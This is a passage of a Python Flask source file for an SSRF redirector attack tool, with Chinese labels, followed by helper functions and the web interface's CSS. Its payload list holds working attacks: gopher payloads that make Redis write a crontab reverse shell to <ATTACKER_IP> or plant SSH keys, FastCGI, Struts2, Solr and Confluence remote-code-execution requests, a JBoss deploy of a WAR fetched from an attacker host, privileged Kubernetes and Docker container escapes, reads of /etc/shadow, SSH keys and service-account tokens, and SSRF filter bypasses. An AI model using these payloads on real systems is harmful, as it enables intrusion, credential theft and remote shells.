    {'name': '内网 HTTP 代理探测 (8080)', 'category': '端口探测', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/', 'description': '常见Web应用端口'},

    # ---------- Gopher 攻击模板 ----------
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (CentOS)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (CentOS, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写计划任务反弹Shell (Ubuntu/Debian)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$25%0d%0a/var/spool/cron/crontabs/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$2%0d%0ap1%0d%0a$64%0d%0a%0d%0a*/1 * * * * bash -i >%26 /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>%261%0d%0a%0d%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入crontab反弹shell (Ubuntu/Debian, 需替换占位符)'},
    {'name': 'Gopher -> Redis 写入SSH公钥 (需替换公钥)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$390%0d%0a%0a%0assh-rsa AAAAB3NzaC1yc2EAAAA... 请替换为你的SSH公钥 %0a%0a%0d%0a*1%0d%0a$4%0d%0asave%0d%0a',
     'description': 'Redis未授权写入SSH公钥 (需替换占位符和公钥)'},
    {'name': 'Gopher -> FastCGI 代码执行 (PHP-FPM)', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0f%10SCRIPT_FILENAME/var/www/html/index.php%01%04%00%01%00%00%00%00%01%05%00%01%00%18%04%00PHP_VALUEauto_prepend_file%20%3d%20php%3a//input%01%04%00%01%00%00%00%00%01%05%00%01%00%18%00%00%3C%3Fphp%20system(%27id%27)%3B%3F%3E',
     'description': '攻击PHP-FPM FastCGI执行系统命令 (需确认PHP文件路径)'},
    {'name': 'Gopher -> SMTP 发送邮件', 'category': 'Gopher 攻击模板', 'method': 'GET',
     'payload': 'gopher://127.0.0.1:25/_EHLO%20localhost%0d%0aMAIL%20FROM%3a%20<admin@internal.com>%0d%0aRCPT%20TO%3a%20<attacker@external.com>%0d%0aDATA%0d%0aSubject%3a%20SSRF%20PenTest%0d%0a%0d%0aThis%20is%20a%20test%20email.%0d%0a.%0d%0aQUIT%0d%0a',
     'description': '利用SMTP发送邮件用于钓鱼/带外'},

    # ---------- 文件读取 ----------
    {'name': '读取 /etc/passwd', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/passwd', 'description': '读取Linux账户信息'},
    {'name': '读取 /etc/shadow (需root)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/shadow', 'description': '尝试读取影子文件（需高权限）'},
    {'name': '读取 SSH 私钥', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///root/.ssh/id_rsa', 'description': '读取root SSH私钥'},
    {'name': '读取 K8s ServiceAccount Token', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/run/secrets/kubernetes.io/serviceaccount/token', 'description': 'Pod内SA Token文件'},
    {'name': '读取 /proc/self/environ', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///proc/self/environ', 'description': '环境变量可能包含敏感信息'},
    {'name': '读取 Windows 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///C:/Windows/System32/drivers/etc/hosts', 'description': 'Windows hosts文件'},
    {'name': '读取 Apache 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/apache2/sites-enabled/000-default.conf', 'description': 'Apache虚拟主机配置'},
    {'name': '读取 Nginx 配置文件', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///etc/nginx/nginx.conf', 'description': 'Nginx主配置文件'},
    {'name': '读取 Tomcat users.xml', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///usr/local/tomcat/conf/tomcat-users.xml', 'description': 'Tomcat管理用户密码'},
    {'name': '读取 应用源码 (常见路径)', 'category': '文件读取', 'method': 'GET', 'payload': 'file:///var/www/html/config.php', 'description': 'PHP应用数据库配置'},
    {'name': 'Java netdoc协议读文件', 'category': '文件读取', 'method': 'GET', 'payload': 'netdoc:///etc/passwd', 'description': '利用Java netdoc协议读取文件'},

    # ---------- 内网漏洞利用 ----------
    {'name': 'Struts2 S2-032 RCE (id命令)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/struts2-showcase/actionChain1.action?redirect:%24%7b%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5b%5d%7b%27sh%27,%20%27-c%27,%20%27id%27%7d)).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char%5b50000%5d,%23c.read(%23d),%23out%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23out.getWriter().println(new%20java.lang.String(%23d)),%23out.close()%7d',
     'description': 'Struts2 S2-032远程代码执行 (GET方式, 可替换命令)'},
    {'name': 'Apache Solr 未授权 RCE (CVE-2017-12629)', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end',
     'description': 'Solr Velocity模板注入RCE'},
    {'name': 'JBoss JMX Console 未授权 RCE', 'category': '内网漏洞利用', 'method': 'GET',
     'payload': 'http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://<ATTACKER_IP>/shell.war',
     'description': 'JBoss未授权远程部署WAR (需搭建恶意war服务器)'},
    {'name': 'Confluence OGNL 注入 (CVE-2021-26084)', 'category': '内网漏洞利用', 'method': 'POST',
     'payload': 'http://127.0.0.1:8090/pages/createpage-entervariables.action',
     'description': 'Confluence OGNL注入RCE (POST方法)',
     'body': 'queryString=%5Cu0027%2b%7bClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027js%5Cu0027%29.eval%28%5Cu0027var+is%3dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28java.lang.Runtime.getRuntime%28%29.exec%28%5Cu0027id%5Cu0027%29.getInputStream%28%29%29%29%3bvar+ss%3d%5Cu0027%5Cu0027%3bwhile%28%28line%3dis.readLine%28%29%29+!%3d+null%29+ss%2b%3dline%3b%5Cu0027%29%7d%2b%5Cu0027'},

    # ---------- K8s/容器 实战特化 ----------
    {'name': 'K8s API Server 探测', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api', 'description': '探测集群内网API Server'},
    {'name': 'K8s 创建恶意Pod (POST)', 'category': 'K8s 渗透', 'method': 'POST',
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/default/pods',
     'description': '尝试利用当前SA创建提权/逃逸Pod',
     'body': json.dumps({"apiVersion":"v1","kind":"Pod","metadata":{"name":"evil-pod"},"spec":{"containers":[{"name":"evil","image":"busybox","command":["/bin/sh","-c","sleep 3600"],"securityContext":{"privileged":True},"volumeMounts":[{"name":"host","mountPath":"/host"}]}],"volumes":[{"name":"host","hostPath":{"path":"/"}}]}}, indent=2)},
    {'name': 'K8s 提取Token (POST)', 'category': 'K8s 渗透', 'method': 'POST',
     'payload': 'https://kubernetes.default.svc/api/v1/namespaces/kube-system/serviceaccounts/default/token',
     'description': 'POST请求生成高权限SA的Token',
     'body': json.dumps({"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest"})},
    {'name': 'K8s 列举所有 Secrets', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/secrets', 'description': '列举集群中的Secrets（需权限）'},
    {'name': 'K8s 列举 Pods', 'category': 'K8s 渗透', 'method': 'GET', 'payload': 'https://kubernetes.default.svc/api/v1/pods', 'description': '列举所有Pod'},

    {'name': 'Kubelet 端口访问探测', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/pods', 'description': '探测Kubelet未授权访问'},
    {'name': 'Kubelet 执行系统命令 (POST)', 'category': 'Kubelet 渗透', 'method': 'POST',
     'payload': 'https://127.0.0.1:10250/run/kube-system/kube-dns/dns',
     'description': '通过Kubelet API无损命令执行(需替换命名空间/Pod名)',
     'body': '{"cmd": ["id"]}'},
    {'name': 'Kubelet exec (标准端点)', 'category': 'Kubelet 渗透', 'method': 'GET', 'payload': 'https://127.0.0.1:10250/exec/kube-system/kube-dns/dns', 'description': 'Kubelet exec检查'},

    {'name': 'Docker 获取容器列表', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/containers/json', 'description': '探测Docker API版本及容器'},
    {'name': 'Docker 创建恶意容器 (POST)', 'category': 'Docker 渗透', 'method': 'POST',
     'payload': 'http://127.0.0.1:2375/containers/create',
     'description': '直接利用Docker API创建挂载特权目录的容器',
     'body': json.dumps({"Image": "busybox", "Cmd": ["/bin/sh", "-c", "sleep 3600"], "HostConfig": {"Binds": ["/:/mnt"]}}, indent=2)},
    {'name': 'Docker exec (websocket)', 'category': 'Docker 渗透', 'method': 'GET', 'payload': 'http://127.0.0.1:2375/exec/container_id/start', 'description': 'Docker exec交互 (需容器ID)'},

    # ---------- 内网服务弱口令与未授权 ----------
    {'name': 'Tomcat Manager 登录', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/manager/html', 'description': 'Tomcat管理界面 (尝试弱口令)'},
    {'name': 'Jenkins Script Console (GET)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8080/script', 'description': 'Jenkins脚本控制台 (未授权仍需POST执行Groovy)'},
    {'name': 'ActiveMQ 控制台 (默认未授权)', 'category': '内网未授权', 'method': 'GET', 'payload': 'http://127.0.0.1:8161/admin/', 'description': 'ActiveMQ管理界面'},
    {'name': 'Hadoop YARN ResourceManager', 'category': '内网未授权', 'method': 'POST',
     'payload': 'http://127.0.0.1:8088/ws/v1/cluster/apps',
     'description': 'Hadoop提交新应用 (可用于RCE)',
     'body': json.dumps({"application-id": "application_1234567890_0001", "application-name": "test", "am-container-spec": {"commands": {"command": "id"}}, "application-type": "YARN"})},

    # ---------- 内网探测基础 ----------
    {'name': '内网 HTTP OPTIONS 探测', 'category': '内网探测', 'method': 'OPTIONS', 'payload': 'http://127.0.0.1:80/', 'description': '探测内网服务支持的方法'},
    {'name': '内网 HTTP TRACE 探测', 'category': '内网探测', 'method': 'TRACE', 'payload': 'http://127.0.0.1:8080/', 'description': '探测内网XST漏洞'},
    {'name': 'Redis dict协议探测', 'category': '内网探测', 'method': 'GET', 'payload': 'dict://127.0.0.1:6379/INFO', 'description': 'dict协议探测Redis'},

    # ---------- SSRF 绕过技巧 ----------
    {'name': '十进制IP绕过 (127.0.0.1)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://2130706433/', 'description': '127.0.0.1的十进制表示'},
    {'name': '十六进制IP绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://0x7f.0.0.1/', 'description': '127.0.0.1的十六进制形式'},
    {'name': 'IPv6映射绕过', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://[::ffff:127.0.0.1]/', 'description': 'IPv6映射的IPv4地址'},
    {'name': 'DNS重绑定域名 (localtest.me)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://localtest.me/', 'description': '解析到127.0.0.1的域名可用于绕过黑名单'},
    {'name': 'URL解析混淆 (userinfo部分)', 'category': '绕过技巧', 'method': 'GET', 'payload': 'http://google.com@127.0.0.1/', 'description': '利用URL中@符号欺骗'},
]

# ==================== 工具函数 ====================
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_beijing_time():
    """获取北京时间字符串"""
    return datetime.now(BEIJING_TZ).strftime('%Y-%m-%d %H:%M:%S')

def log_request(extra_data=None):
    request_body = request.get_data().decode('utf-8', errors='replace')
    log_entry = {
        'id': str(uuid.uuid4())[:8],
        'timestamp': get_beijing_time(),
        'ts': time.time(),  # 命中时间轴使用的高精度时间戳
        'ip': get_client_ip(),
        'method': request.method,
        'path': request.path,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'request_body': request_body[:500] + ('...' if len(request_body)>500 else ''),
        'redirect_url': None,
        'status_code': None,
        'response_headers': {},
        'response_body': '',
        'extra_data': extra_data or {}
    }
    LOGS.insert(0, log_entry)
    if len(LOGS) > CONFIG['max_logs']: LOGS.pop()
    return log_entry

def check_access_token():
    if CONFIG['access_token']:
        token = request.args.get('token') or request.headers.get('X-Access-Token')
        if token != CONFIG['access_token']: return False
    return True

def safe_int(value, default):
    """安全的int转换, 防止恶意/非法参数导致500"""
    try:
        return int(value)
    except (TypeError, ValueError):
        return default

def make_fallback_response(target_url, mode):
    """
    降级跳转响应: 针对不跟随30x的客户端。
    - refresh: 仅 Refresh 响应头
    - meta:    200 + <meta http-equiv="refresh">
    - js:      200 + location.replace()
    - combo:   Refresh头 + Meta + JS 三重保险
    注意: URL分别按 HTML属性上下文(markupsafe.escape) 与 JS字符串上下文(json.dumps + </ 转义)处理
    """
    esc_url = str(html_escape(target_url))
    js_url = json.dumps(target_url, ensure_ascii=False).replace('</', r'<\/')
    head_extra = ''
    body_extra = ''
    if mode in ('meta', 'combo'):
        head_extra = f'<meta http-equiv="refresh" content="0;url={esc_url}">'
    if mode in ('js', 'combo'):
        body_extra = f'<script>location.replace({js_url});</script>'
    html = (f'<!DOCTYPE html><html><head><meta charset="utf-8">'
            f'<title>Redirecting</title>{head_extra}</head>'
            f'<body>{body_extra}<p style="font-family:monospace;">Redirecting to '
            f'<a href="{esc_url}">{esc_url}</a></p></body></html>')
    response = make_response(html, 200)
    response.headers['Content-Type'] = 'text/html; charset=utf-8'
    if mode in ('refresh', 'combo'):
        response.headers['Refresh'] = f'0;url={target_url}'
    return response

def make_head_bypass_response(target_url=None, custom_status=None, custom_headers=None, custom_body=None):
    """
    构造HEAD伪装响应，让服务器认为目标存在。
    支持多种伪装策略:
    - 200: 标准200 OK (默认)
    - 自定义状态码和响应体
    """
    status = custom_status or HEAD_BYPASS_CONFIG['status_code']

    # 构造响应体 (HEAD请求通常不返回body, 但设置Content-Length)
    body_content = custom_body or ''
    if request.method == 'HEAD':
        # HEAD 不返回body, 但返回Content-Length暗示有内容
        response = make_response('', status)
        response.headers['Content-Length'] = HEAD_BYPASS_CONFIG['fake_content_length']
    else:
        response = make_response(body_content, status)

    # 设置伪装的响应头
    response.headers['Content-Type'] = HEAD_BYPASS_CONFIG['content_type']
    for k, v in HEAD_BYPASS_CONFIG['extra_headers'].items():
        response.headers[k] = v

    # 覆盖自定义头
    if custom_headers:
        for k, v in custom_headers.items():
            response.headers[k] = v

    return response

def should_bypass_head(head_bypass_flag):
    """
    判断是否应该对HEAD请求进行伪装绕过。
    head_bypass_flag: 可以是 '1', 'true', True, 'auto' 等
    """
    if not head_bypass_flag:
        return False
    if isinstance(head_bypass_flag, str):
        return head_bypass_flag.lower() in ('1', 'true', 'yes', 'on', 'auto')
    return bool(head_bypass_flag)

# 启动时注册盲SSRF默认基准组 (开箱即用; 依赖 get_beijing_time, 须在工具函数定义之后执行)
for _d in BLIND_BENCH_DEFAULTS:
    bb_register(_d['path'], status=_d['status'], body=_d['body'],
                content_type=_d['content_type'], delay_ms=_d['delay_ms'], desc=_d['desc'])

# ==================== Web界面模板 ====================
INDEX_HTML = """
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SSRF 30x Redirector</title>
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-card: #1c2128;
            --bg-input: #0d1117;
            --border-color: rgba(56, 189, 248, 0.12);
            --border-hover: rgba(56, 189, 248, 0.45);
            --accent: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-yellow: #d29922;
            --accent-purple: #bc8cff;
            --accent-orange: #f0883e;
            --accent-cyan: #39d5ff;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --text-muted: #6e7681;
            --radius: 12px;
            --radius-sm: 8px;
            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            --transition: all 0.2s ease;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans SC', Roboto, Helvetica, Arial, sans-serif;
            background: var(--bg-primary);
            min-height: 100vh;
            color: var(--text-primary);
            padding: 32px 40px;
            font-size: 15px;
            line-height: 1.6;
        }
        .container { max-width: 1800px; margin: 0 auto; }

        /* Header */
        .header {
            text-align: center;
            padding: 32px 0 28px;
            margin-bottom: 32px;
            border-bottom: 1px solid var(--border-color);
        }
        .header h1 {
            color: var(--accent);
            font-size: 2.2em;
            margin-bottom: 10px;
            font-weight: 800;
            letter-spacing: -0.5px;
        }
        .header p {
            color: var(--text-secondary);
            font-size: 0.95em;
            max-width: 900px;
            margin: 0 auto;
        }

        /* Stats */
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            margin-bottom: 32px;
        }
        .stat-item {
            text-align: center;
            padding: 22px 16px;
            background: var(--bg-card);
            border-radius: var(--radius);
            border: 1px solid var(--border-color);
            transition: var(--transition);
        }
        .stat-item:hover {
            border-color: var(--border-hover);
            transform: translateY(-2px);
        }
        .stat-value {
            font-size: 2.2em;
            font-weight: 800;
            color: var(--accent-green);
            line-height: 1.2;
        }
        .stat-label {
            color: var(--text-muted);
            font-size: 13px;
            margin-top: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 600;
        }

        /* Grid Layout */
        .grid {
            display: grid;
            grid-template-columns: 1.5fr 0.5fr;
            gap: 24px;
            margin-bottom: 40px;
        }

        /* Card */
        .card {
            background: var(--bg-card);
            border-radius: var(--radius);
            padding: 32px;
            border: 1px solid var(--border-color);
            box-shadow: var(--shadow);
        }
        .card h2 {
            color: var(--accent);
            margin-bottom: 24px;
            font-size: 1.3em;
            font-weight: 700;
        }

        /* Form */
        .form-group { margin-bottom: 20px; }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: var(--text-secondary);
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .form-group select,
        .form-group input,
        select,
        input[type="text"] {
            width: 100%;
            padding: 14px 18px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 15px;
            transition: var(--transition);
            line-height: 1.4;
        }
        .form-group select:focus,
        .form-group input:focus,
        select:focus,
        input:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }
        textarea {
            width: 100%;
            padding: 14px 18px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: var(--radius-sm);
            color: var(--text-primary);
            font-size: 14px;
            transition: var(--transition);
            line-height: 1.5;
            resize: vertical;
        }
        textarea:focus {
            outline: none;
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.1);
        }

        /* Buttons */
        .btn {
            background: var(--accent);
            color: #0d1117;
            border: none;
            padding: 12px 24px;
            border-radius: var(--radius-sm);
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            letter-spacing: 0.3px;
        }
        .btn:hover { opacity: 0.88; transform: translateY(-1px); }
        .btn:active { transform: translateY(0); }
        .btn-secondary { background: var(--accent-purple); color: #fff; }
        .btn-warning { background: var(--accent-yellow); color: #0d1117; }
        .btn-danger { background: var(--accent-red); color: #fff; padding: 8px 16px; font-size: 13px; }
        .btn-small { padding: 8px 18px; font-size: 13px; }
        .btn-ghost {
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
        }
        .btn-ghost:hover { border-color: var(--accent); color: var(--accent); }
        .btn-orange { background: var(--accent-orange); color: #0d1117; }
        .btn-cyan { background: var(--accent-cyan); color: #0d1117; }

        /* Result */
        .result-box {
            margin-top: 24px;
            padding: 20px;
            background: rgba(63, 185, 80, 0.04);
            border-radius: var(--radius);
            border: 1px solid rgba(63, 185, 80, 0.25);
            display: none;
        }
        .result-box.show { display: block; }
        .payload-url {
            font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
            word-break: break-all;
            padding: 16px;
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            font-size: 14px;
            color: var(--accent-yellow);
            user-select: all;
            margin-bottom: 14px;
            line-height: 1.7;
            border: 1px solid var(--border-color);
        }
        .copy-btn {
            padding: 10px 20px;
            background: rgba(63, 185, 80, 0.12);
            color: var(--accent-green);
            border: 1px solid rgba(63, 185, 80, 0.3);
            border-radius: 6px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: var(--transition);
        }
        .copy-btn:hover { background: rgba(63, 185, 80, 0.22); }

        /* Payload 首跳 SSRF 绕过变形面板 (v1.7) */
        .payload-bypass-box {
            margin-top: 18px;
            background: var(--bg-primary);
            border: 1px solid rgba(57, 213, 255, 0.25);
            border-radius: var(--radius-sm);
            overflow: hidden;
        }
        .pb-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 12px 16px;
            background: rgba(57, 213, 255, 0.06);
            cursor: pointer;
            user-select: none;
            transition: var(--transition);
        }
        .pb-header:hover { background: rgba(57, 213, 255, 0.12); }
        .pb-title {
            font-size: 14px;
            font-weight: 700;
            color: var(--accent-cyan);
        }
        .pb-badge {
            display: inline-block;
            margin-left: 8px;
            padding: 2px 8px;
            font-size: 10px;
            font-weight: 700;
            border-radius: 4px;
            background: rgba(57, 213, 255, 0.15);
            border: 1px solid rgba(57, 213, 255, 0.35);
            vertical-align: middle;
        }
        .pb-toggle-hint {
            font-size: 12px;
            color: var(--text-muted);
            font-weight: 600;
        }
        .pb-body { padding: 14px 16px; }
        .payload-bypass-box.collapsed .pb-body { display: none; }
        .pb-target {
            font-size: 12px;
            color: var(--text-secondary);
            background: var(--bg-input);
            border-left: 3px solid var(--accent-cyan);
            border-radius: 4px;
            padding: 10px 12px;
            margin-bottom: 12px;
            word-break: break-all;
            line-height: 1.7;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
        }
        .pb-target b { color: var(--accent-cyan); }
        .pb-domain-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }
        .pb-domain-row label {
            font-size: 11px;
            color: var(--accent-cyan);
            font-weight: 600;
            white-space: nowrap;
        }
        .pb-domain-row input {
            flex: 1;
            min-width: 160px;
            padding: 7px 10px;
            font-size: 12px;
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
        }
        .pb-variant-list { display: flex; flex-direction: column; gap: 8px; }
        .pb-row {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 9px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            transition: var(--transition);
            flex-wrap: wrap;
        }
        .pb-row:hover { border-color: rgba(57, 213, 255, 0.45); }
        .pb-label {
            flex-shrink: 0;
            min-width: 118px;
            font-size: 11px;
            font-weight: 700;
            color: var(--accent-cyan);
            background: rgba(57, 213, 255, 0.08);
            border: 1px solid rgba(57, 213, 255, 0.3);
            padding: 4px 8px;
            border-radius: 4px;
            text-align: center;
        }
        .pb-target-text {
            flex: 1;
            min-width: 200px;
            font-size: 12px;
            color: var(--accent-yellow);
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
            word-break: break-all;
            line-height: 1.5;
        }
        .pb-actions { display: flex; gap: 6px; flex-shrink: 0; }
        .pb-actions .btn { padding: 6px 10px; font-size: 11px; }
        .pb-note {
            font-size: 12px;
            color: var(--text-muted);
            line-height: 1.8;
            padding: 10px 12px;
            background: var(--bg-input);
            border-radius: 6px;
            border-left: 3px solid var(--text-muted);
        }

        /* 按原理分组的变体展示 (v1.8) */
        .pb-group-header {
            display: flex;
            align-items: baseline;
            gap: 8px;
            margin: 14px 0 8px;
            padding-bottom: 6px;
            border-bottom: 1px dashed var(--border-color);
            flex-wrap: wrap;
        }
        .pb-group-header:first-child { margin-top: 0; }
        .pb-group-name {
            font-size: 13px;
            font-weight: 700;
            color: var(--accent-cyan);
            white-space: nowrap;
        }
        .pb-group-count {
            font-size: 11px;
            font-weight: 700;
            color: var(--bg-primary);
            background: var(--accent-cyan);
            border-radius: 8px;
            padding: 1px 7px;
        }
        .pb-group-principle {
            font-size: 11px;
            color: var(--text-muted);
            font-weight: 400;
        }
        .pb-row-note {
            flex-basis: 100%;
            font-size: 10px;
            color: var(--accent-yellow);
            margin-top: -2px;
            opacity: 0.85;
        }
        .bypass-group-header {
            margin: 14px 0 8px;
            padding-bottom: 6px;
            border-bottom: 1px dashed var(--border-color);
        }
        .bypass-group-name {
            font-size: 13px;
            font-weight: 700;
            color: var(--accent-cyan);
        }
        .bypass-group-count {
            font-size: 11px;
            font-weight: 700;
            color: var(--bg-primary);
            background: var(--accent-cyan);
            border-radius: 8px;
            padding: 1px 7px;
            margin-left: 6px;
        }
        .bypass-group-principle {
            font-size: 11px;
            color: var(--text-muted);
            display: block;
            margin-top: 3px;
            font-weight: 400;
        }

        /* 变形 URL 批量复制工具栏 (v1.9) */
        .btn-green { background: var(--accent-green); color: #0d1117; }
        .pb-batch-row {
            display: flex;
            align-items: center;
            gap: 10px;
            flex-wrap: wrap;
            margin-bottom: 12px;
            padding: 9px 12px;
            background: var(--bg-input);
            border: 1px solid var(--border-color);
            border-radius: 6px;
        }
        .pb-sel-all {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 12px;
            color: var(--text-secondary);
            cursor: pointer;
            font-weight: 700;
            white-space: nowrap;
        }
        .pb-check {
            display: flex;
            align-items: center;
            flex-shrink: 0;
            cursor: pointer;
            margin: 0;
        }
        .pb-check input, .pb-sel-all input, .pb-group-gsel input { accent-color: var(--accent-cyan); cursor: pointer; }
        .pb-fmt-label {
            font-size: 11px;
            color: var(--text-muted);
            white-space: nowrap;
        }
        .pb-format-select {
            padding: 6px 8px;
            font-size: 12px;
            background: var(--bg-primary);
            color: var(--text-primary);
            border: 1px solid var(--border-color);
            border-radius: 4px;
            cursor: pointer;
        }
        .pb-sel-count {
            margin-left: auto;
            font-size: 12px;
            color: var(--accent-yellow);
            font-weight: 700;
            white-space: nowrap;
        }
        .pb-sep { color: var(--border-color); }
        .pb-group-gsel {
            margin-left: auto;
            font-size: 11px;
            color: var(--text-muted);
            cursor: pointer;
            white-space: nowrap;
            font-weight: 600;
        }
        .pb-group-gsel:hover { color: var(--accent-cyan); }

        /* Tabs */
        .nav-tabs {
            display: flex;
            gap: 6px;
            margin-bottom: 24px;
            background: var(--bg-input);
            border-radius: var(--radius-sm);
            padding: 6px;
            border: 1px solid var(--border-color);
        }
        .nav-tab {
            padding: 10px 22px;
            background: transparent;
            border: none;
            border-radius: 6px;
            color: var(--text-muted);
            cursor: pointer;
            transition: var(--transition);
            font-size: 14px;
            font-weight: 600;
        }
        .nav-tab:hover { color: var(--text-primary); }
        .nav-tab.active { background: var(--accent); color: #0d1117; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* Log panel sub-tabs */
        .logtab-content { display: none; }
        .logtab-content.active { display: block; }

        /* Steps */
        .step-item {
            border-radius: var(--radius-sm);
            padding: 18px;
            margin-bottom: 14px;
            border: 1px solid var(--border-color);
            background: var(--bg-input);
            transition: var(--transition);
        }
        .step-item:hover { border-color: var(--border-hover); }
        .step-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }
